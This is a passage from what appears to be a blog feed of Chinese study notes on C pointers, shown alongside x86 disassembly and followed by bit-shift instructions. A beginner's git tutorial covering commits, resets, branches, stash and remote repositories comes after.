title="取地址符&amp;"></a>取地址符&amp;</h2><ul><li>&amp;可以取任何<strong>变量</strong>的地址</li><li>&amp;a的类型就是a的类型加上*</li><li>带*的类型用来存储地址</li></ul><p>局部变量</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>**** a;</span><br><span class="line">    <span class="keyword">short</span> b;</span><br><span class="line">    <span class="keyword">int</span>* c;</span><br><span class="line">    <span class="keyword">char</span>***** aa= &amp;a;</span><br><span class="line">    <span class="keyword">short</span>* bb = &amp;b;</span><br><span class="line">    <span class="keyword">int</span>** cc = &amp;c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1:        char**** a;</span><br><span class="line">2:        short b;</span><br><span class="line">3:        int* c;</span><br><span class="line">4:       char***** aa= &amp;a;</span><br><span class="line">00401028   lea         eax,[ebp-4]</span><br><span class="line">0040102B   mov         dword ptr [ebp-10h],eax</span><br><span class="line">5:       short* bb = &amp;b;</span><br><span class="line">0040102E   lea         ecx,[ebp-8]</span><br><span class="line">00401031   mov         dword ptr [ebp-14h],ecx</span><br><span class="line">6:       int** cc = &amp;c;</span><br><span class="line">00401034   lea         edx,[ebp-0Ch]</span><br><span class="line">00401037   mov         dword ptr [ebp-18h],edx</span><br></pre></td></tr></table></figure><p>全局变量</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span>**** a;</span><br><span class="line"><span class="keyword">short</span> b;</span><br><span class="line"><span class="keyword">int</span>* c;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>***** aa= &amp;a;</span><br><span class="line">    <span class="keyword">short</span>* bb = &amp;b;</span><br><span class="line">    <span class="keyword">int</span>** cc = &amp;c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">9:        char***** aa= &amp;a;</span><br><span class="line">00401028   mov         dword ptr [ebp-4],offset a (00427e3c)</span><br><span class="line">10:       short* bb = &amp;b;</span><br><span class="line">0040102F   mov         dword ptr [ebp-8],offset b (00427e38)</span><br><span class="line">11:       int** cc = &amp;c;</span><br><span class="line">00401036   mov         dword ptr [ebp-0Ch],offset c (00427e34)</span><br></pre></td></tr></table></figure><p>offset a的意思是指a的地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lea eax, [00427e3c]</span><br><span class="line">mov dword ptr [ebp-4],eax</span><br><span class="line">; 意思一样</span><br></pre></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title="*"></a>*</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span>* x;</span><br><span class="line"><span class="comment">//*x == int</span></span><br><span class="line"><span class="keyword">char</span>** y;</span><br><span class="line"><span class="comment">//*y == char*</span></span><br></pre></td></tr></table></figure><p>源码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a = <span class="number">22</span>;</span><br><span class="line"><span class="keyword">int</span>* b = &amp;a;</span><br><span class="line"><span class="keyword">int</span> c = *b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反汇编：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00401028   mov         dword ptr [ebp-4],16h</span><br><span class="line">0040102F   lea         eax,[ebp-4]</span><br><span class="line">00401032   mov         dword ptr [ebp-8],eax</span><br><span class="line">00401035   mov         ecx,dword ptr [ebp-8]</span><br><span class="line">00401038   mov         edx,dword ptr [ecx]</span><br><span class="line">0040103A   mov         dword ptr [ebp-0Ch],edx</span><br></pre></td></tr></table></figure><p>编译器没有直接把地址存到ecx里，而是用ecx和edx进行过渡。</p><h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> arr[<span class="number">5</span>] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;;</span><br><span class="line">    <span class="comment">//int* x = &amp;arr[0]可以简写成int* x = arr</span></span><br><span class="line">    <span class="keyword">int</span>* x = arr;</span><br><span class="line">    x+<span class="number">1</span>;</span><br><span class="line">    <span class="comment">//x+1==地址+1×4</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><em><em>int</em> x = &amp;arr[0]可以简写成int</em> x = arr**</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span>* a;</span><br><span class="line">    <span class="comment">//*(a+0) == a[0];</span></span><br><span class="line"><span class="comment">//*(a+2) == a[2];</span></span><br><span class="line">    <span class="keyword">char</span>** b;</span><br><span class="line">    <span class="comment">//*(*(b+0)+0) == b[0][0];</span></span><br><span class="line">    <span class="comment">//*(*(b+2)+3) == b[2][3];</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>汇编：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">1:        int* a;</span><br><span class="line">2:        printf(&quot;%d&quot;,*(a+0));</span><br><span class="line">0040D838   mov         eax,dword ptr [ebp-4]</span><br><span class="line">0040D83B   mov         ecx,dword ptr [eax]</span><br><span class="line">0040D83D   push        ecx</span><br><span class="line">0040D83E   push        offset string &quot;%s &quot; (0042201c)</span><br><span class="line">0040D843   call        printf (00401060)</span><br><span class="line">0040D848   add         esp,8</span><br><span class="line">3:        printf(&quot;%d&quot;,a[0]);</span><br><span class="line">0040D84B   mov         edx,dword ptr [ebp-4]</span><br><span class="line">0040D84E   mov         eax,dword ptr [edx]</span><br><span class="line">0040D850   push        eax</span><br><span class="line">0040D851   push        offset string &quot;%s &quot; (0042201c)</span><br><span class="line">0040D856   call        printf (00401060)</span><br><span class="line">0040D85B   add         esp,8</span><br><span class="line">4:        printf(&quot;%d&quot;,*(a+2));</span><br><span class="line">0040D85E   mov         ecx,dword ptr [ebp-4]</span><br><span class="line">0040D861   mov         edx,dword ptr [ecx+8]</span><br><span class="line">0040D864   push        edx</span><br><span class="line">0040D865   push        offset string &quot;%s &quot; (0042201c)</span><br><span class="line">0040D86A   call        printf (00401060)</span><br><span class="line">0040D86F   add         esp,8</span><br><span class="line">5:       printf(&quot;%d&quot;,a[2]);</span><br><span class="line">0040D872   mov         eax,dword ptr [ebp-4]</span><br><span class="line">0040D875   mov         ecx,dword ptr [eax+8]</span><br><span class="line">0040D878   push        ecx</span><br><span class="line">0040D879   push        offset string &quot;%s &quot; (0042201c)</span><br><span class="line">0040D87E   call        printf (00401060)</span><br><span class="line">0040D883   add         esp,8</span><br><span class="line">6:       char** b;</span><br><span class="line">7:       printf(&quot;%d&quot;,*(*(b+0)+0));</span><br><span class="line">0040D886   mov         edx,dword ptr [ebp-8]</span><br><span class="line">0040D889   mov         eax,dword ptr [edx]</span><br><span class="line">0040D88B   movsx       ecx,byte ptr [eax]</span><br><span class="line">0040D88E   push        ecx</span><br><span class="line">0040D88F   push        offset string &quot;%s &quot; (0042201c)</span><br><span class="line">0040D894   call        printf (00401060)</span><br><span class="line">0040D899   add         esp,8</span><br><span class="line">8:       printf(&quot;%d&quot;,b[0][0]);</span><br><span class="line">0040D89C   mov         edx,dword ptr [ebp-8]</span><br><span class="line">0040D89F   mov         eax,dword ptr [edx]</span><br><span class="line">0040D8A1   movsx       ecx,byte ptr [eax]</span><br><span class="line">0040D8A4   push        ecx</span><br><span class="line">0040D8A5   push        offset string &quot;%s &quot; (0042201c)</span><br><span class="line">0040D8AA   call        printf (00401060)</span><br><span class="line">0040D8AF   add         esp,8</span><br><span class="line">9:       printf(&quot;%d&quot;,*(*(b+2)+3));</span><br><span class="line">0040D8B2   mov         edx,dword ptr [ebp-8]</span><br><span class="line">0040D8B5   mov         eax,dword ptr [edx+8]</span><br><span class="line">0040D8B8   movsx       ecx,byte ptr [eax+3]</span><br><span class="line">0040D8BC   push        ecx</span><br><span class="line">0040D8BD   push        offset string &quot;%s &quot; (0042201c)</span><br><span class="line">0040D8C2   call        printf (00401060)</span><br><span class="line">0040D8C7   add         esp,8</span><br><span class="line">10:       printf(&quot;%d&quot;,b[2][3]);</span><br><span class="line">0040D8CA   mov         edx,dword ptr [ebp-8]</span><br><span class="line">0040D8CD   mov         eax,dword ptr [edx+8]</span><br><span class="line">0040D8D0   movsx       ecx,byte ptr [eax+3]</span><br><span class="line">0040D8D4   push        ecx</span><br><span class="line">0040D8D5   push        offset string &quot;%s &quot; (0042201c)</span><br><span class="line">0040D8DA   call        printf (00401060)</span><br><span class="line">0040D8DF   add         esp,8</span><br></pre></td></tr></table></figure><h2 id="数组指针"><a href="#数组指针" class="headerlink" title="数组指针"></a>数组指针</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">10</span>] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>&#125;;</span><br><span class="line">    <span class="built_in"><span class="keyword">int</span></span> (*p)[<span class="number">2</span>];</span><br><span class="line">    p = (<span class="built_in"><span class="keyword">int</span></span>(*)[<span class="number">2</span>])a;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,**p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>*p和p的存储内容相同，但是宽度不相同。</strong></p><h2 id="函数指针"><a href="#函数指针" class="headerlink" title="函数指针"></a>函数指针</h2><p>因为函数的宽度是不确定的，所以不能做++–加减整数，相减的操作。但是可以做比较大小的操作。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Fun</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a+b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in"><span class="keyword">int</span></span> (*p)(<span class="keyword">int</span>,<span class="keyword">int</span>);</span><br><span class="line">    p = (<span class="built_in"><span class="keyword">int</span></span>(*)<span class="built_in">p</span>(<span class="keyword">int</span>,<span class="keyword">int</span>))Fun;</span><br><span class="line">    p = Fun;<span class="comment">//Fun函数名里面就是地址</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以隐藏代码到数据区</p><br><h1 id="0x10-异常"><a href="#0x10-异常" class="headerlink" title="0x10 异常"></a>0x10 异常</h1><p>0xC0000005访问错误</p><br><h1 id="0x11-位运算"><a href="#0x11-位运算" class="headerlink" title="0x11 位运算"></a>0x11 位运算</h1><h2 id="算数移位（有符号）"><a href="#算数移位（有符号）" class="headerlink" title="算数移位（有符号）"></a>算数移位（有符号）</h2><p>SAL：算术左移</p><p>SAR：算数右移</p><p>格式：<code>SAL/SAR Reg/Mem, CL/Imm</code></p><p>会把移出的数据放到cf里</p><p>SAL左移的时候会补0，SAR右移补符号位。</p><h2 id="逻辑移位（无符号）"><a href="#逻辑移位（无符号）" class="headerlink" title="逻辑移位（无符号）"></a>逻辑移位（无符号）</h2><p>SHL左<strong>（有符号无符号的左移都用这个）</strong></p><p>SHR右</p><p>只补0，移出的位放到CF里</p><h2 id="循环移位"><a href="#循环移位" class="headerlink" title="循环移位"></a>循环移位</h2><p>ROL左</p><p>ROR右</p><p>把移出的位放到要补的地方，移出的位放到CF里</p><h2 id="带进位的循环移位"><a href="#带进位的循环移位" class="headerlink" title="带进位的循环移位"></a>带进位的循环移位</h2><p>RCL左</p><p>RCR右</p><p>把CF里放的值补上，移出的位放到CF里</p>]]></content>
      
      
      <categories>
          
          <category> 2020年8月 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>[工具使用] git</title>
      <link href="/2020/02/18/git/"/>
      <url>/2020/02/18/git/</url>
      
        <content type="html"><![CDATA[<h1 id="常用"><a href="#常用" class="headerlink" title="常用"></a>常用</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git add file</span><br><span class="line">git commit -m <span class="string">&quot;what&quot;</span></span><br><span class="line">git push origin master</span><br></pre></td></tr></table></figure><h1 id="版本库"><a href="#版本库" class="headerlink" title="版本库"></a>版本库</h1><p>版本库又名仓库，可以理解为一个目录，这个目录里面的所有文件都可以被git管理。每个文件的修改、删除git都能跟踪，以便任何时刻追踪历史或者还原。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir learngit//首先创建一个目录</span><br><span class="line"><span class="built_in">cd</span> learngit</span><br><span class="line">git init//把这个目录变成git可以管理的仓库(初始化一个git仓库)</span><br></pre></td></tr></table></figure><p>然后你会发现当前目录下多了一个.git目录，这个目录是git用来跟踪管理版本库的。这个目录默认是隐藏的，可以使用<code>ls -ah</code>命令查看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">touch readme.txt//创建一个txt文件</span><br><span class="line">git add readme.txt//把文件添加到仓库(暂存区)，可多次使用，添加多个文件</span><br><span class="line">git commit -m <span class="string">&quot;wrote a readme file&quot;</span>//将暂存区内容提交到本地仓库</span><br></pre></td></tr></table></figure><p><code>-m</code>后面输入的是本次提交的说明，可以输入任意内容，当然最好是有意义的，这样就能从历史记录里方便找到改动记录。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git status//可以掌握工作区的状态，告诉你有文件被修改过</span><br><span class="line">git diff readme.txt//查看difference(差别)</span><br><span class="line">git diff HEAD -- readme.txt//查看工作区和版本库里面最新版本的区别</span><br></pre></td></tr></table></figure><h1 id="版本回退"><a href="#版本回退" class="headerlink" title="版本回退"></a>版本回退</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">log</span>//显示最近到最远的提交日记</span><br></pre></td></tr></table></figure><p>如果嫌输出信息太多，可以加上<code>--pretty=oneline</code>参数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">log</span> --pretty=oneline</span><br></pre></td></tr></table></figure><p>你所看到一大串的数字加字母是commit id(提交id)。在git中，用HEAD表示最新提交，上一个版本是HEAD^，上上一个版本就是HEAD^^，100个版本写成HEAD~100。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git reset --hard HEAD^//回退到上一个版本</span><br></pre></td></tr></table></figure><p>想要回到之前的版本，就需要找到之前的commit id，把前面几位输上，git会自动去寻找。不能只写一两位，因为git可能会找到多个版本号。</p><p>如果关掉了电脑，没记住git log的显示出的commit id，可以使用：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git reflog//用来查看你的命令历史，以便确定要回到未来的哪个版本</span><br></pre></td></tr></table></figure><p>工作区有一个隐藏目录.git，这个不算工作区，而是git的版本库。<br>git的版本库里存放了很多东西，其中最重要的是stage的暂存区，还有git为我们自动创建的第一个分支master，以及指向master的第一个指针叫HEAD。</p><p><img src="https://www.liaoxuefeng.com/files/attachments/919020037470528/0" alt="git-repo"></p><h1 id="撤销修改"><a href="#撤销修改" class="headerlink" title="撤销修改"></a>撤销修改</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout -- readme.txt//把readme文件在工作区的修改全部撤销。</span><br></pre></td></tr></table></figure><p>两种情况：</p><ul><li>一种是readme.txt自修改后还没有被放到暂存区，现在，撤销修改就回到和版本库一模一样的状态。</li><li>一种是readme.txt已经添加到暂存区后，又作了修改，现在，撤销修改就回到添加到暂存区后的状态。</li></ul> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git reset HEAD readme.txt//把暂存区的内容放回工作区</span><br></pre></td></tr></table></figure><p><code>git reset</code>命令既可以回退版本，也可以把暂存区的修改回退到工作区。HEAD表示最新版本。</p><h1 id="删除文件"><a href="#删除文件" class="headerlink" title="删除文件"></a>删除文件</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git add test.txt</span><br><span class="line">git commit -m <span class="string">&quot;add test.txt&quot;</span></span><br><span class="line">rm test.txt//手动删除文件</span><br><span class="line">git rm test.txt//从版本库中删除文件，和git add一样</span><br><span class="line">git commit -m <span class="string">&quot;remove test.txt&quot;</span></span><br><span class="line">git checkout -- test.txt//从版本库里还原</span><br></pre></td></tr></table></figure><p><code>git checkout</code>其实就是用版本库里的版本替换工作区的版本。</p><h1 id="远程仓库"><a href="#远程仓库" class="headerlink" title="远程仓库"></a>远程仓库</h1><p>你的git仓库和github仓库之间的传输是通过SSH加密的</p><p>第一步：创建SSH Key。在用户主目录下，看看有没有.ssh目录，如果有，再看看这个目录下有没有<code>id_rsa</code>和<code>id_rsa.pub</code>这两个文件，如果已经有了，可直接跳到下一步。如果没有，打开shell，创建SSH Key。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C <span class="string">&quot;youremail@example.com&quot;</span>//创建SSH Key</span><br></pre></td></tr></table></figure><p><code>id_rsa</code>是私钥，不能泄露出去。<code>id_rsa.pub</code>是公钥，可以放心地告诉任何人。</p><p>第二步：登录github，打开”Settings”，”SSH and GPG keys”页面：然后点击”New SSH Key”，填上任意”Title”，在Key文本框里粘贴<code>id_rsa.pub</code>文件的内容。</p><h2 id="创建远程库"><a href="#创建远程库" class="headerlink" title="创建远程库"></a>创建远程库</h2><p>登录github，然后在右上角找到”Create a new repository”，创建一个新仓库。</p><p>在”Repository name”填入库名，其他保持默认设置，点击”Create repository”按钮，成功创建一个新的git仓库</p><p>然后我们根据github的提示，在本地learngit仓库下运行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git remote add origin git@github.com:账户名/仓库名.git</span><br></pre></td></tr></table></figure><p>远程库的名字就是<code>origin</code>，这是git默认的叫法。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push -u origin master//把本地内容上传到远程库</span><br></pre></td></tr></table></figure><p>把本地库内容推送到远程，用<code>git push</code>命令。</p><p>由于远程库是空的，我们第一次推送master分支的时候，加上了<code>-u</code>参数，git不但会把本地的master分支内容推送到远程新的master分支，而且会把本地的master和远程的master分支关联起来，在以后的推送或者拉取时就可以简化命令。</p><p>从现在起，只要本地作了提交，就可以通过命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push origin master</span><br></pre></td></tr></table></figure><p>把本地master分支的最新修改推送至github。</p><h2 id="SSH警告"><a href="#SSH警告" class="headerlink" title="SSH警告"></a>SSH警告</h2><p>当第一次使用git的clone或者push命令连接github时，会得到一个警告：</p><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">The authenticity of host &#x27;github.com (xx.xx.xx.xx)&#x27; can&#x27;t be established.</span><br><span class="line">RSA key fingerprint is xx.xx.xx.xx.xx.</span><br><span class="line">Are you sure you want to continue connecting (yes/no)?</span><br></pre></td></tr></table></figure></blockquote><p>这是因为git使用SSH连接，而SSH连接在第一次验证github服务器的Key时，需要确认github的Key的指纹信息是否真的来自github的服务器，输入yes回车即可。</p><p>Git会输出一个警告，告诉你已经把GitHub的Key添加到本机的一个信任列表里了：</p><blockquote><p>Warning: Permanently added ‘github.com’ (RSA) to the list of known hosts.</p></blockquote><p>这个警告只会出现一次，后面的操作就不会有任何警告了。</p><h2 id="克隆"><a href="#克隆" class="headerlink" title="克隆"></a>克隆</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span>//克隆</span><br></pre></td></tr></table></figure><h1 id="分支管理"><a href="#分支管理" class="headerlink" title="分支管理"></a>分支管理</h1><p>分支在实际中有什么用呢？假设你准备开发一个新功能，但是需要两周才能完成，第一周你写了50%的代码，如果立刻提交，由于代码还没写完，不完整的代码库会导致别人不能干活了。如果等代码全部写完再一次提交，又存在丢失每天进度的巨大风险。</p><p>现在有了分支，就不用怕了。你创建了一个属于你自己的分支，别人看不到，还继续在原来的分支上正常工作，而你在自己的分支上干活，想提交就提交，直到开发完毕后，再一次性合并到原来的分支上，这样，既安全，又不影响别人工作。</p><h2 id="创建与合并分支"><a href="#创建与合并分支" class="headerlink" title="创建与合并分支"></a>创建与合并分支</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git branch dev//创建dev分支</span><br><span class="line">git switch dev//切换到dev分支</span><br><span class="line">git switch -c dev//创建并切换到dev分支</span><br><span class="line">git branch//查看当前分支</span><br></pre></td></tr></table></figure><p>在dev分支上的操作不会影响到master</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git merge dev//把dev分支的工作成果合并到当前分支上</span><br></pre></td></tr></table></figure><p>合并完成后，就可以放心地删除dev分支了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git branch -d dev//删除dev分支</span><br><span class="line">git branch -D dev//强行删除dev分支。如果git没有合并，会删除失败</span><br></pre></td></tr></table></figure><p>当Git无法自动合并分支时，就必须首先解决冲突。解决冲突后，再提交，合并完成。</p><p>直接cat冲突文件，Git会用<code>&lt;&lt;&lt;&lt;&lt;&lt;&lt;</code>，<code>=======</code>，<code>&gt;&gt;&gt;&gt;&gt;&gt;&gt;</code>标记出不同分支的内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">log</span> --graph//查看分支合并图</span><br></pre></td></tr></table></figure><h2 id="分支管理策略"><a href="#分支管理策略" class="headerlink" title="分支管理策略"></a>分支管理策略</h2><p>通常，合并分支时，如果没有分歧解决，就会直接移动文件指针，这就是<code>Fast forward</code>模式。</p><p>但这种模式下，删除分支后，会丢掉分支信息。</p><p>如果要<strong>强制禁用Fast forward模式</strong>，Git就会在merge时生成一个新的commit，这样，从分支历史上就可以看出分支信息。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git merge --no-ff -m <span class="string">&quot;merge with no-ff&quot;</span> dev//禁用fast forward合并dev分支</span><br></pre></td></tr></table></figure><p><code> --no-ff</code>参数表示禁用<code>Fast forward</code>，因为本次合并要创建一个新的commit，所以加上<code>-m</code>参数，把commit描述写进去。</p><h2 id="分支策略"><a href="#分支策略" class="headerlink" title="分支策略"></a>分支策略</h2><p><code>master</code>分支应该是非常稳定的，也就是仅用来发布新版本，平时不在上面干活</p><p>干活在<code>dev</code>分支上，到版本发布的时候，再把<code>dev</code>分支合并到<code>master</code>上，在<code>master</code>分支发布1.0版本。</p><p>你和你的小伙伴们每个人都在<code>dev</code>分支上干活，每个人都有自己的分支，时不时地往<code>dev</code>分支上合并就可以了。</p><h2 id="bug分支"><a href="#bug分支" class="headerlink" title="bug分支"></a>bug分支</h2><p>修复bug时，我们会通过创建新的bug分支进行修复，然后合并，最后删除；</p><p>当手头工作没有完成时，先把工作现场<code>git stash</code>一下</p><p>然后去修复bug，需要在哪个分支上修复bug，就从哪个分支创建临时分支；</p><p>修复后，再<code>git stash pop</code>，回到工作现场；</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git stash apply//恢复后，stash内容不删除</span><br><span class="line">git stash drop//删除stash内容</span><br><span class="line">git stash pop//恢复的同时把stash内容也删除了</span><br><span class="line">git stash list//查看stash了哪些存储</span><br></pre></td></tr></table></figure><p> 你可以多次stash，恢复的时候，先用<strong>git stash list</strong>查看，然后恢复指定的stash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git stash apply stash@&#123;0&#125;</span><br></pre></td></tr></table></figure><p>在master分支上修复的bug，想要合并到当前dev分支，可以用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git switch dev//切换到dev目录</span><br><span class="line">git cherry-pick &lt;commit&gt;//合并</span><br></pre></td></tr></table></figure><p>把bug提交的修改“复制”到当前分支，避免重复劳动。</p><h1 id="多人协作"><a href="#多人协作" class="headerlink" title="多人协作"></a>多人协作</h1><figure class="highlight 